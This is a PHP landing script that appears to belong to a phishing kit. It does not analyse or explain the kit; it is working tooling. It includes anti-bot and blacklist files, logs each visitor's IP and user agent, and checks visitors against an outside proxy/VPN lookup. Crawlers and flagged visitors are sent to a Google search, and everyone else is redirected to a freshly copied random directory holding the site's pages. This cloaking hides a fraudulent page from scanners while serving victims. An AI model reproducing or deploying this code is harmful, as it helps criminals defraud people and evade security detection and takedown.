<?php

# Import Settings

$settings = include('settings/settings.php');

# Debug

if($settings['debug'] == "1"){
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
};

# Using Crawler Detection

$useragent = $_SERVER['HTTP_USER_AGENT'];

include("home/Bots/fucker.php");
include("home/Bots/blacklister.php");
include("home/Bots/Anti/out/blacklist.php");
include("home/Bots/Anti/out/bot-crawler.php");
include("home/Bots/Anti/out/anti.php");
include("home/Bots/Anti/out/ref.php");
include("home/Bots/Anti/out/bots.php");
include("home/Bots/Anti/out/Crawler/src/CrawlerDetect.php");

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

$settings = include('settings/settings.php');

if($settings['log_user'] == "1"){
	function get_client_ip() {
	    $ipaddress = '';
	    if (getenv('HTTP_CLIENT_IP'))
	        $ipaddress = getenv('HTTP_CLIENT_IP');
	    else if(getenv('HTTP_X_FORWARDED_FOR'))
	        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
	    else if(getenv('HTTP_X_FORWARDED'))
	        $ipaddress = getenv('HTTP_X_FORWARDED');
	    else if(getenv('HTTP_FORWARDED_FOR'))
	        $ipaddress = getenv('HTTP_FORWARDED_FOR');
	    else if(getenv('HTTP_FORWARDED'))
	        $ipaddress = getenv('HTTP_FORWARDED');
	    else if(getenv('REMOTE_ADDR'))
	        $ipaddress = getenv('REMOTE_ADDR');
	    else
	        $ipaddress = 'UNKNOWN';
	    return $ipaddress;
	}
	$date = date("h:i:s d/m/Y");
	$ip = get_client_ip();
	$useragent = $useragent;
	$logfile = fopen("Logs/logs.txt", "a+");
	$logs = "<=====[ LOGGED - CLIENT {$date}|{$ip}|{$useragent} ] =====> \n";
	fwrite($logfile, $logs);
	fclose($logfile);
}
		


if($settings['print_match'] == "1"){
	echo $CrawlerDetect->getMatches();
}

if($settings['proxy_block'] == "1"){

	# Check VPN | Proxy 

	$ip = get_client_ip();
	$url = "https://blackbox.ipinfo.app/lookup/".$ip;
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$resp = curl_exec($ch);
	curl_close($ch);
	$result = $resp;
	if($ip != "127.0.0.1"){
		if($result == "Y") {
		$click = fopen("Logs/proxy-block.txt","a");
		$message = $ip."\n";
		$date = date("h:i:s d/m/Y");
		fwrite($click,"{$ip}|{$date}|VPN/Proxy\n");
		($click);
		header('Location: https://www.google.com/search?q='.$settings["out"]);
		die();
		}
	}

}



if ($CrawlerDetect->isCrawler($useragent)){
	header('Referer: '.$settings['referer']);
	header('Location: https://google.com/search?q='.$settings['out']);
} else {
	$DIR=md5(rand(0,100000000000));
	function recurse_copy($home,$DIR) {
		$dir = opendir($home);
		@mkdir($DIR, 0777);
		while(false !== ( $file = readdir($dir)) ) {
			if (( $file != '.' ) && ( $file != '..' )) {
				if ( is_dir($home . '/' . $file) ) {
					recurse_copy($home . '/' . $file,$DIR . '/' . $file);
				}	else {
					copy($home . '/' . $file,$DIR . '/' . $file);
				}
			}
		}
		closedir($dir);
	}

	
	# Client Number

	$o = file_get_contents("Logs/client.txt");
	$client = (int)$o + 1;
	$add = fopen('Logs/client.txt', 'r+');
	fwrite($add, $client);
	fclose($add);

	$home="home";
	recurse_copy( $home, $DIR );
	header("Location: $DIR");
	$file = fopen("temp.txt","w");
	fwrite($file, $DIR);
}
?> 
